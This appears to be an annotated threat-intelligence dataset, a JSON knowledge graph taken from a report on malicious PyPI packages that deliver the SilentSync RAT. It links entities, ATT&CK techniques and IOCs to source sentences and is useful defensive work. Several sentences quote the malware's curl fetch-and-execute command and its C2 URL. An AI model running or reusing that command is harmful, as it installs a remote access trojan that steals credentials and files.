@@ -1,0 +1,1099 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_0b3331b6ef38",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "SilentSync",
+        "edges": [
+          "EDGE_1",
+          "EDGE_2",
+          "EDGE_3",
+          "EDGE_4",
+          "EDGE_5",
+          "EDGE_6",
+          "EDGE_7",
+          "EDGE_8",
+          "EDGE_9",
+          "EDGE_10",
+          "EDGE_11"
+        ],
+        "sentence_indices": [
+          5,
+          6,
+          29,
+          33,
+          36,
+          37,
+          40
+        ],
+        "span_sentences": [
+          "Both Python packages deliver a Remote Access Trojan (RAT) that ThreatLabz dubbed SilentSync, which is retrieved from Pastebin.",
+          "SilentSync’s capabilities include remote command execution, file exfiltration, screen capturing, and web browser data theft.",
+          "Note that the Python package currently only targets Windows systems, although SilentSync has built-in features for Linux and macOS as well.",
+          "Similar to sisaws\n, the secmeasure\ninitialization script contains a malicious function named sanitize_input\n, that when invoked, will execute the same hex-encoded curl command used by the sisaws\npackage to distribute SilentSync RAT.",
+          "The malicious script downloaded by sisaws\nand secmeasure\nis SilentSync, a Python-based RAT with remote access and data collection capabilities.",
+          "SilentSync communicates with its C2 server over HTTP to a hardcoded server whose IP address (200.58.107[.]25) is stored in Base64 and decoded at runtime.",
+          "SilentSync is capable of harvesting browser data, executing shell commands, capturing screenshots, and stealing files."
+        ]
+      },
+      {
+        "node_id": "HL_0f277059215f",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Argentina",
+        "edges": [],
+        "sentence_indices": [
+          3
+        ],
+        "span_sentences": [
+          "The former Python package leverages typosquatting for the legitimate sisa\npackage, which integrates with the public APIs for Sistema Integrado de Información Sanitaria Argentino (SISA), which is Argentina's national health information system."
+        ]
+      },
+      {
+        "node_id": "HL_14b356b40489",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "termncolor",
+        "edges": [
+          "EDGE_12"
+        ],
+        "sentence_indices": [
+          1
+        ],
+        "span_sentences": [
+          "In July 2025, a malicious Python package named termncolor\nwas identified by ThreatLabz."
+        ]
+      },
+      {
+        "node_id": "HL_411c797dc4be",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "sisa",
+        "edges": [
+          "EDGE_13"
+        ],
+        "sentence_indices": [
+          3,
+          8,
+          9,
+          19
+        ],
+        "span_sentences": [
+          "The former Python package leverages typosquatting for the legitimate sisa\npackage, which integrates with the public APIs for Sistema Integrado de Información Sanitaria Argentino (SISA), which is Argentina's national health information system.",
+          "The sisaws\npackage imitates the behavior of the legitimate Python package sisa\n, which includes the modules puco and renaper\nthat act as wrappers around public government APIs for healthcare information.",
+          "These modules enable applications to request the user’s National Identity Document (DNI) number, call the corresponding SISA web service, and return structured responses.",
+          "This response contains structured data that mimics SISA services, including a user profile with a msal.gov.ar email address, assigned roles, and a token expiration timestamp."
+        ]
+      },
+      {
+        "node_id": "HL_44463ac59fa0",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows",
+        "edges": [],
+        "sentence_indices": [
+          29,
+          43
+        ],
+        "span_sentences": [
+          "Note that the Python package currently only targets Windows systems, although SilentSync has built-in features for Linux and macOS as well.",
+          "Note that the browserdata\ncommand is currently supported on Windows only."
+        ]
+      },
+      {
+        "node_id": "HL_48235807f061",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Edge",
+        "edges": [
+          "EDGE_14"
+        ],
+        "sentence_indices": [
+          44
+        ],
+        "span_sentences": [
+          "When invoked, the client enumerates local profiles for Chromium-family browsers (Chrome, Edge, Brave) and Firefox, harvesting four categories per profile: history, autofill, cookies, and saved credentials."
+        ]
+      },
+      {
+        "node_id": "HL_5075b2ca94a2",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Python Package Index",
+        "edges": [
+          "EDGE_15"
+        ],
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Zscaler ThreatLabz regularly monitors for threats in the popular Python Package Index (PyPI), which contains open source libraries that are frequently used by many Python developers."
+        ]
+      },
+      {
+        "node_id": "HL_792063b0fdc7",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "sisaws",
+        "edges": [
+          "EDGE_16",
+          "EDGE_17"
+        ],
+        "sentence_indices": [
+          2,
+          7,
+          8,
+          15,
+          21,
+          27,
+          30,
+          31,
+          33,
+          36,
+          45
+        ],
+        "span_sentences": [
+          "Just a few weeks later, on August 4, 2025, ThreatLabz uncovered two more malicious Python packages named sisaws\nand secmeasure\n.",
+          "In the following section, we examine how the sisaws\nand secmeasure\nPyPI packages deliver SilentSync RAT.",
+          "The sisaws\npackage imitates the behavior of the legitimate Python package sisa\n, which includes the modules puco and renaper\nthat act as wrappers around public government APIs for healthcare information.",
+          "The sisaws\npackage contains a function named gen_token\nin the initialization script (__init__.py\n) that acts as a backdoor malware downloader.",
+          "The sisaws\npackage’s search()\nfunction enforces the use of the secondary token.",
+          "If a developer imports the sisaws\npackage and invokes the gen_token\nfunction, the code will decode a hexadecimal string that reveals a curl command, which is then used to fetch an additional Python script, as shown below.",
+          "ThreatLabz identified another Python package in PyPI named secmeasure\nthat was uploaded by the same author ([email protected]) as the sisaws\npackage.",
+          "While secmeasure\n’s description claims the package is a “library for cleaning strings and applying security measures”, in reality, secmeasure\nbehaves similarly to sisaws\n.",
+          "Similar to sisaws\n, the secmeasure\ninitialization script contains a malicious function named sanitize_input\n, that when invoked, will execute the same hex-encoded curl command used by the sisaws\npackage to distribute SilentSync RAT.",
+          "The malicious script downloaded by sisaws\nand secmeasure\nis SilentSync, a Python-based RAT with remote access and data collection capabilities.",
+          "The discovery of the malicious PyPI packages sisaws\nand secmeasure\nhighlight the growing risk of supply chain attacks within public software repositories."
+        ]
+      },
+      {
+        "node_id": "HL_8914579ab950",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Sistema Integrado de Información Sanitaria Argentino",
+        "edges": [],
+        "sentence_indices": [
+          3
+        ],
+        "span_sentences": [
+          "The former Python package leverages typosquatting for the legitimate sisa\npackage, which integrates with the public APIs for Sistema Integrado de Información Sanitaria Argentino (SISA), which is Argentina's national health information system."
+        ]
+      },
+      {
+        "node_id": "HL_8e1659bea8b4",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Zscaler ThreatLabz",
+        "edges": [],
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Zscaler ThreatLabz regularly monitors for threats in the popular Python Package Index (PyPI), which contains open source libraries that are frequently used by many Python developers."
+        ]
+      },
+      {
+        "node_id": "HL_9acefe286339",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Brave",
+        "edges": [
+          "EDGE_18"
+        ],
+        "sentence_indices": [
+          44
+        ],
+        "span_sentences": [
+          "When invoked, the client enumerates local profiles for Chromium-family browsers (Chrome, Edge, Brave) and Firefox, harvesting four categories per profile: history, autofill, cookies, and saved credentials."
+        ]
+      },
+      {
+        "node_id": "HL_9cacb7207125",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Pastebin",
+        "edges": [
+          "EDGE_19"
+        ],
+        "sentence_indices": [
+          5,
+          28
+        ],
+        "span_sentences": [
+          "Both Python packages deliver a Remote Access Trojan (RAT) that ThreatLabz dubbed SilentSync, which is retrieved from Pastebin.",
+          "curl -sL https://pastebin.com/raw/jaH2uRE1 -o %TEMP%\\\\helper.py && python %TEMP%\\\\helper.py\nThe Python script retrieved from PasteBin is written to the filename helper.py in a temporary directory and executed."
+        ]
+      },
+      {
+        "node_id": "HL_a08bab4a149d",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Firefox",
+        "edges": [
+          "EDGE_20"
+        ],
+        "sentence_indices": [
+          44
+        ],
+        "span_sentences": [
+          "When invoked, the client enumerates local profiles for Chromium-family browsers (Chrome, Edge, Brave) and Firefox, harvesting four categories per profile: history, autofill, cookies, and saved credentials."
+        ]
+      },
+      {
+        "node_id": "HL_b07e83768d2c",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "macOS",
+        "edges": [],
+        "sentence_indices": [
+          29
+        ],
+        "span_sentences": [
+          "Note that the Python package currently only targets Windows systems, although SilentSync has built-in features for Linux and macOS as well."
+        ]
+      },
+      {
+        "node_id": "HL_b34e8271d122",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "ThreatLabz",
+        "edges": [],
+        "sentence_indices": [
+          0,
+          1,
+          2,
+          4,
+          5,
+          30
+        ],
+        "span_sentences": [
+          "Zscaler ThreatLabz regularly monitors for threats in the popular Python Package Index (PyPI), which contains open source libraries that are frequently used by many Python developers.",
+          "In July 2025, a malicious Python package named termncolor\nwas identified by ThreatLabz.",
+          "Just a few weeks later, on August 4, 2025, ThreatLabz uncovered two more malicious Python packages named sisaws\nand secmeasure\n.",
+          "Interestingly, ThreatLabz discovered another malicious package named secmeasure\n, which was created by the same author.",
+          "Both Python packages deliver a Remote Access Trojan (RAT) that ThreatLabz dubbed SilentSync, which is retrieved from Pastebin.",
+          "ThreatLabz identified another Python package in PyPI named secmeasure\nthat was uploaded by the same author ([email protected]) as the sisaws\npackage."
+        ]
+      },
+      {
+        "node_id": "HL_e71a4e9c6342",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "PyPI",
+        "edges": [
+          "EDGE_21"
+        ],
+        "sentence_indices": [
+          0,
+          7,
+          30,
+          45
+        ],
+        "span_sentences": [
+          "Zscaler ThreatLabz regularly monitors for threats in the popular Python Package Index (PyPI), which contains open source libraries that are frequently used by many Python developers.",
+          "In the following section, we examine how the sisaws\nand secmeasure\nPyPI packages deliver SilentSync RAT.",
+          "ThreatLabz identified another Python package in PyPI named secmeasure\nthat was uploaded by the same author ([email protected]) as the sisaws\npackage.",
+          "The discovery of the malicious PyPI packages sisaws\nand secmeasure\nhighlight the growing risk of supply chain attacks within public software repositories."
+        ]
+      },
+      {
+        "node_id": "HL_ea761e410a92",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Linux",
+        "edges": [],
+        "sentence_indices": [
+          29
+        ],
+        "span_sentences": [
+          "Note that the Python package currently only targets Windows systems, although SilentSync has built-in features for Linux and macOS as well."
+        ]
+      },
+      {
+        "node_id": "HL_ed7a3e3c0a3c",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "secmeasure",
+        "edges": [
+          "EDGE_22"
+        ],
+        "sentence_indices": [
+          2,
+          4,
+          7,
+          30,
+          31,
+          32,
+          33,
+          35,
+          36,
+          45
+        ],
+        "span_sentences": [
+          "Just a few weeks later, on August 4, 2025, ThreatLabz uncovered two more malicious Python packages named sisaws\nand secmeasure\n.",
+          "Interestingly, ThreatLabz discovered another malicious package named secmeasure\n, which was created by the same author.",
+          "In the following section, we examine how the sisaws\nand secmeasure\nPyPI packages deliver SilentSync RAT.",
+          "ThreatLabz identified another Python package in PyPI named secmeasure\nthat was uploaded by the same author ([email protected]) as the sisaws\npackage.",
+          "While secmeasure\n’s description claims the package is a “library for cleaning strings and applying security measures”, in reality, secmeasure\nbehaves similarly to sisaws\n.",
+          "The secmeasure\npackage includes various string manipulation functions, but the primary purpose is to deploy malware.",
+          "Similar to sisaws\n, the secmeasure\ninitialization script contains a malicious function named sanitize_input\n, that when invoked, will execute the same hex-encoded curl command used by the sisaws\npackage to distribute SilentSync RAT.",
+          "In addition to behavioral similarities, the metadata of the secmeasure.",
+          "The malicious script downloaded by sisaws\nand secmeasure\nis SilentSync, a Python-based RAT with remote access and data collection capabilities.",
+          "The discovery of the malicious PyPI packages sisaws\nand secmeasure\nhighlight the growing risk of supply chain attacks within public software repositories."
+        ]
+      },
+      {
+        "node_id": "HL_ef30ecbf31a8",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "National Registry of Persons",
+        "edges": [],
+        "sentence_indices": [
+          12
+        ],
+        "span_sentences": [
+          "Similarly, the renaper\nmodule performs lookups against the National Registry of Persons (RENAPER) database."
+        ]
+      },
+      {
+        "node_id": "HL_fde5e6472d67",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Chrome",
+        "edges": [
+          "EDGE_23"
+        ],
+        "sentence_indices": [
+          44
+        ],
+        "span_sentences": [
+          "When invoked, the client enumerates local profiles for Chromium-family browsers (Chrome, Edge, Brave) and Firefox, harvesting four categories per profile: history, autofill, cookies, and saved credentials."
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1036",
+        "edges": [
+          "EDGE_13",
+          "EDGE_16"
+        ],
+        "best_span_ranges": [
+          [
+            8,
+            8
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The sisaws\npackage imitates the behavior of the legitimate Python package sisa\n, which includes the modules puco and renaper\nthat act as wrappers around public government APIs for healthcare information."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1059",
+        "edges": [
+          "EDGE_1",
+          "EDGE_24",
+          "EDGE_27",
+          "EDGE_32",
+          "EDGE_33"
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            6
+          ],
+          [
+            23,
+            24
+          ],
+          [
+            27,
+            27
+          ],
+          [
+            27,
+            28
+          ],
+          [
+            28,
+            28
+          ],
+          [
+            32,
+            33
+          ],
+          [
+            33,
+            33
+          ],
+          [
+            40,
+            40
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "SilentSync’s capabilities include remote command execution, file exfiltration, screen capturing, and web browser data theft."
+          ],
+          [
+            "The response from the external server is processed in an unusual way.",
+            "Instead of being parsed through a standard format such as JSON, the data is passed into Python’s ast.literal_eval()\nfunction after trimming the first four characters."
+          ],
+          [
+            "If a developer imports the sisaws\npackage and invokes the gen_token\nfunction, the code will decode a hexadecimal string that reveals a curl command, which is then used to fetch an additional Python script, as shown below."
+          ],
+          [
+            "If a developer imports the sisaws\npackage and invokes the gen_token\nfunction, the code will decode a hexadecimal string that reveals a curl command, which is then used to fetch an additional Python script, as shown below.",
+            "curl -sL https://pastebin.com/raw/jaH2uRE1 -o %TEMP%\\\\helper.py && python %TEMP%\\\\helper.py\nThe Python script retrieved from PasteBin is written to the filename helper.py in a temporary directory and executed."
+          ],
+          [
+            "curl -sL https://pastebin.com/raw/jaH2uRE1 -o %TEMP%\\\\helper.py && python %TEMP%\\\\helper.py\nThe Python script retrieved from PasteBin is written to the filename helper.py in a temporary directory and executed."
+          ],
+          [
+            "The secmeasure\npackage includes various string manipulation functions, but the primary purpose is to deploy malware.",
+            "Similar to sisaws\n, the secmeasure\ninitialization script contains a malicious function named sanitize_input\n, that when invoked, will execute the same hex-encoded curl command used by the sisaws\npackage to distribute SilentSync RAT."
+          ],
+          [
+            "Similar to sisaws\n, the secmeasure\ninitialization script contains a malicious function named sanitize_input\n, that when invoked, will execute the same hex-encoded curl command used by the sisaws\npackage to distribute SilentSync RAT."
+          ],
+          [
+            "SilentSync is capable of harvesting browser data, executing shell commands, capturing screenshots, and stealing files."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1070",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1070",
+        "edges": [
+          "EDGE_2"
+        ],
+        "best_span_ranges": [
+          [
+            42,
+            42
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "After exfiltration, all artifacts are deleted from the infected system to avoid detection."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1071",
+        "edges": [
+          "EDGE_3",
+          "EDGE_29",
+          "EDGE_35"
+        ],
+        "best_span_ranges": [
+          [
+            21,
+            22
+          ],
+          [
+            37,
+            37
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The sisaws\npackage’s search()\nfunction enforces the use of the secondary token.",
+            "When the token is present, the function sends an HTTP GET request to a hardcoded endpoint, as shown in the example below:\nhttp://200.58.107[.]25:2104/datalist?dni=&password=perro\nThe query sends the DNI value provided along with a static password."
+          ],
+          [
+            "SilentSync communicates with its C2 server over HTTP to a hardcoded server whose IP address (200.58.107[.]25) is stored in Base64 and decoded at runtime."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1105",
+        "edges": [
+          "EDGE_4",
+          "EDGE_19",
+          "EDGE_25",
+          "EDGE_28",
+          "EDGE_34"
+        ],
+        "best_span_ranges": [
+          [
+            5,
+            5
+          ],
+          [
+            15,
+            15
+          ],
+          [
+            27,
+            27
+          ],
+          [
+            27,
+            28
+          ],
+          [
+            28,
+            28
+          ],
+          [
+            32,
+            33
+          ],
+          [
+            33,
+            33
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Both Python packages deliver a Remote Access Trojan (RAT) that ThreatLabz dubbed SilentSync, which is retrieved from Pastebin."
+          ],
+          [
+            "The sisaws\npackage contains a function named gen_token\nin the initialization script (__init__.py\n) that acts as a backdoor malware downloader."
+          ],
+          [
+            "If a developer imports the sisaws\npackage and invokes the gen_token\nfunction, the code will decode a hexadecimal string that reveals a curl command, which is then used to fetch an additional Python script, as shown below."
+          ],
+          [
+            "If a developer imports the sisaws\npackage and invokes the gen_token\nfunction, the code will decode a hexadecimal string that reveals a curl command, which is then used to fetch an additional Python script, as shown below.",
+            "curl -sL https://pastebin.com/raw/jaH2uRE1 -o %TEMP%\\\\helper.py && python %TEMP%\\\\helper.py\nThe Python script retrieved from PasteBin is written to the filename helper.py in a temporary directory and executed."
+          ],
+          [
+            "curl -sL https://pastebin.com/raw/jaH2uRE1 -o %TEMP%\\\\helper.py && python %TEMP%\\\\helper.py\nThe Python script retrieved from PasteBin is written to the filename helper.py in a temporary directory and executed."
+          ],
+          [
+            "The secmeasure\npackage includes various string manipulation functions, but the primary purpose is to deploy malware.",
+            "Similar to sisaws\n, the secmeasure\ninitialization script contains a malicious function named sanitize_input\n, that when invoked, will execute the same hex-encoded curl command used by the sisaws\npackage to distribute SilentSync RAT."
+          ],
+          [
+            "Similar to sisaws\n, the secmeasure\ninitialization script contains a malicious function named sanitize_input\n, that when invoked, will execute the same hex-encoded curl command used by the sisaws\npackage to distribute SilentSync RAT."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1113",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1113",
+        "edges": [
+          "EDGE_5"
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            6
+          ],
+          [
+            40,
+            40
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "SilentSync’s capabilities include remote command execution, file exfiltration, screen capturing, and web browser data theft."
+          ],
+          [
+            "SilentSync is capable of harvesting browser data, executing shell commands, capturing screenshots, and stealing files."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1119",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1119",
+        "edges": [
+          "EDGE_6"
+        ],
+        "best_span_ranges": [
+          [
+            43,
+            44
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Note that the browserdata\ncommand is currently supported on Windows only.",
+            "When invoked, the client enumerates local profiles for Chromium-family browsers (Chrome, Edge, Brave) and Firefox, harvesting four categories per profile: history, autofill, cookies, and saved credentials."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1132",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1132",
+        "edges": [
+          "EDGE_7",
+          "EDGE_30"
+        ],
+        "best_span_ranges": [
+          [
+            37,
+            37
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "SilentSync communicates with its C2 server over HTTP to a hardcoded server whose IP address (200.58.107[.]25) is stored in Base64 and decoded at runtime."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1140",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1140",
+        "edges": [
+          "EDGE_8",
+          "EDGE_26",
+          "EDGE_31"
+        ],
+        "best_span_ranges": [
+          [
+            27,
+            27
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "If a developer imports the sisaws\npackage and invokes the gen_token\nfunction, the code will decode a hexadecimal string that reveals a curl command, which is then used to fetch an additional Python script, as shown below."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1195",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1195",
+        "edges": [
+          "EDGE_9",
+          "EDGE_12",
+          "EDGE_15",
+          "EDGE_17",
+          "EDGE_21",
+          "EDGE_22"
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ],
+          [
+            2,
+            2
+          ],
+          [
+            3,
+            3
+          ],
+          [
+            45,
+            45
+          ],
+          [
+            46,
+            46
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "In July 2025, a malicious Python package named termncolor\nwas identified by ThreatLabz."
+          ],
+          [
+            "Just a few weeks later, on August 4, 2025, ThreatLabz uncovered two more malicious Python packages named sisaws\nand secmeasure\n."
+          ],
+          [
+            "The former Python package leverages typosquatting for the legitimate sisa\npackage, which integrates with the public APIs for Sistema Integrado de Información Sanitaria Argentino (SISA), which is Argentina's national health information system."
+          ],
+          [
+            "The discovery of the malicious PyPI packages sisaws\nand secmeasure\nhighlight the growing risk of supply chain attacks within public software repositories."
+          ],
+          [
+            "By leveraging typosquatting and impersonating legitimate packages, threat actors can gain access to personally identifiable information (PII)."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1217",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1217",
+        "edges": [
+          "EDGE_10",
+          "EDGE_14",
+          "EDGE_18",
+          "EDGE_20",
+          "EDGE_23"
+        ],
+        "best_span_ranges": [
+          [
+            43,
+            44
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Note that the browserdata\ncommand is currently supported on Windows only.",
+            "When invoked, the client enumerates local profiles for Chromium-family browsers (Chrome, Edge, Brave) and Firefox, harvesting four categories per profile: history, autofill, cookies, and saved credentials."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1552",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1552",
+        "edges": [
+          "EDGE_36"
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This function contains a hardcoded token value (f5d3a8c2-4c01-47e2-a1a4-4dcb9a3d7e65\n) that must be provided as input."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1560",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1560",
+        "edges": [
+          "EDGE_11"
+        ],
+        "best_span_ranges": [
+          [
+            41,
+            41
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "File exfiltration can be performed for entire directories (and compressed into ZIP archives) or for individual files."
+          ]
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_3db1d13a65e9",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://pastebin.com/raw/jaH2uRE1",
+        "edges": [
+          "EDGE_24",
+          "EDGE_25",
+          "EDGE_26"
+        ],
+        "sentence_indices": [
+          28
+        ],
+        "span_sentences": [
+          "curl -sL https://pastebin.com/raw/jaH2uRE1 -o %TEMP%\\\\helper.py && python %TEMP%\\\\helper.py\nThe Python script retrieved from PasteBin is written to the filename helper.py in a temporary directory and executed."
+        ]
+      },
+      {
+        "node_id": "IOC_5a0a14ee2a51",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "%TEMP%\\helper.py",
+        "edges": [
+          "EDGE_27",
+          "EDGE_28"
+        ],
+        "sentence_indices": [
+          28
+        ],
+        "span_sentences": [
+          "curl -sL https://pastebin.com/raw/jaH2uRE1 -o %TEMP%\\\\helper.py && python %TEMP%\\\\helper.py\nThe Python script retrieved from PasteBin is written to the filename helper.py in a temporary directory and executed."
+        ]
+      },
+      {
+        "node_id": "IOC_85e510a32c55",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "200.58.107[.]25",
+        "edges": [
+          "EDGE_29",
+          "EDGE_30",
+          "EDGE_31"
+        ],
+        "sentence_indices": [
+          22,
+          37
+        ],
+        "span_sentences": [
+          "When the token is present, the function sends an HTTP GET request to a hardcoded endpoint, as shown in the example below:\nhttp://200.58.107[.]25:2104/datalist?dni=&password=perro\nThe query sends the DNI value provided along with a static password.",
+          "SilentSync communicates with its C2 server over HTTP to a hardcoded server whose IP address (200.58.107[.]25) is stored in Base64 and decoded at runtime."
+        ]
+      },
+      {
+        "node_id": "IOC_8e55aa892862",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "__init__.py",
+        "edges": [
+          "EDGE_32"
+        ],
+        "sentence_indices": [
+          15
+        ],
+        "span_sentences": [
+          "The sisaws\npackage contains a function named gen_token\nin the initialization script (__init__.py\n) that acts as a backdoor malware downloader."
+        ]
+      },
+      {
+        "node_id": "IOC_b2df890376f8",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "helper.py",
+        "edges": [
+          "EDGE_33",
+          "EDGE_34"
+        ],
+        "sentence_indices": [
+          28
+        ],
+        "span_sentences": [
+          "curl -sL https://pastebin.com/raw/jaH2uRE1 -o %TEMP%\\\\helper.py && python %TEMP%\\\\helper.py\nThe Python script retrieved from PasteBin is written to the filename helper.py in a temporary directory and executed."
+        ]
+      },
+      {
+        "node_id": "IOC_b4454ab3f535",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://200.58.107[.]25:2104/datalist?dni=&password=perro",
+        "edges": [
+          "EDGE_35",
+          "EDGE_36"
+        ],
+        "sentence_indices": [
+          22
+        ],
+        "span_sentences": [
+          "When the token is present, the function sends an HTTP GET request to a hardcoded endpoint, as shown in the example below:\nhttp://200.58.107[.]25:2104/datalist?dni=&password=perro\nThe query sends the DNI value provided along with a static password."
+        ]
+      },
+      {
+        "node_id": "IOC_ffb23c207233",
+        "node_class": "ioc",
+        "node_type": "Email",
+        "node_text": "[email protected]",
+        "edges": [],
+        "sentence_indices": [
+          30
+        ],
+        "span_sentences": [
+          "ThreatLabz identified another Python package in PyPI named secmeasure\nthat was uploaded by the same author ([email protected]) as the sisaws\npackage."
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_2",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1070"
+    },
+    {
+      "edge_id": "EDGE_3",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_4",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_5",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1113"
+    },
+    {
+      "edge_id": "EDGE_6",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1119"
+    },
+    {
+      "edge_id": "EDGE_7",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1132"
+    },
+    {
+      "edge_id": "EDGE_8",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1140"
+    },
+    {
+      "edge_id": "EDGE_9",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_10",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1217"
+    },
+    {
+      "edge_id": "EDGE_11",
+      "node_u": "HL_0b3331b6ef38",
+      "node_v": "TTP_T1560"
+    },
+    {
+      "edge_id": "EDGE_12",
+      "node_u": "HL_14b356b40489",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_13",
+      "node_u": "HL_411c797dc4be",
+      "node_v": "TTP_T1036"
+    },
+    {
+      "edge_id": "EDGE_14",
+      "node_u": "HL_48235807f061",
+      "node_v": "TTP_T1217"
+    },
+    {
+      "edge_id": "EDGE_15",
+      "node_u": "HL_5075b2ca94a2",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_16",
+      "node_u": "HL_792063b0fdc7",
+      "node_v": "TTP_T1036"
+    },
+    {
+      "edge_id": "EDGE_17",
+      "node_u": "HL_792063b0fdc7",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_18",
+      "node_u": "HL_9acefe286339",
+      "node_v": "TTP_T1217"
+    },
+    {
+      "edge_id": "EDGE_19",
+      "node_u": "HL_9cacb7207125",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_20",
+      "node_u": "HL_a08bab4a149d",
+      "node_v": "TTP_T1217"
+    },
+    {
+      "edge_id": "EDGE_21",
+      "node_u": "HL_e71a4e9c6342",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_22",
+      "node_u": "HL_ed7a3e3c0a3c",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_23",
+      "node_u": "HL_fde5e6472d67",
+      "node_v": "TTP_T1217"
+    },
+    {
+      "edge_id": "EDGE_24",
+      "node_u": "IOC_3db1d13a65e9",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_25",
+      "node_u": "IOC_3db1d13a65e9",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_26",
+      "node_u": "IOC_3db1d13a65e9",
+      "node_v": "TTP_T1140"
+    },
+    {
+      "edge_id": "EDGE_27",
+      "node_u": "IOC_5a0a14ee2a51",
